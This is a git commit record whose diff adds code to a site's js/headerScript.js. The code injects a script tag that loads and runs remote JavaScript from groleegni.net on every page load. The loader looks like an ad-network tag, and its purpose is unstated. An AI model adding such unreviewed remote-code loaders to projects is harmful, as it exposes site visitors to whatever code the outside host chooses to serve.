ff510699d27ba6e7c11fc9f5b0b9676af7c0708a
Bankmock <133338375+Bankmock@users.noreply.github.com>
2025-02-08 00:55:35 +0530

    Update headerScript.js

--- js/headerScript.js
+++ js/headerScript.js
@@ -1,1 +1,24 @@
+(function () {
+    var d = 'groleegni.net';
+    var z = 8868889;
+    var s = document.createElement('script');
+    s.src = 'https://' + d + '/401/' + z;
+    
+    s.onload = function() {
+        console.log('Script loaded successfully.');
+    };
+
+    s.onerror = function() {
+        console.error('Failed to load script.');
+    };
+
+    try {
+        (document.body || document.documentElement).appendChild(s);
+    } catch (e) {
+        console.error('Error appending script:', e);
+    }
+})();
+
+
+
 
